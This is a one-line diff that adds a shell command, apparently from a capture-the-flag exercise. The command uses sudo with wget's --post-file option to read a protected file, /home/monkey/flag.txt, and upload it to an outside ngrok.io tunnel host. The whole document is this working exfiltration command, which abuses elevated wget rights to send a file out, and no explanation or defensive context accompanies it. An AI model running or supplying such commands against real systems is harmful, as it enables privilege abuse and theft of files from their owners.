@@ -1,0 +1,1 @@
+sudo /usr/bin/wget --post-file=/home/monkey/flag.txt http://8a20-108-180-201-208.ngrok.io/
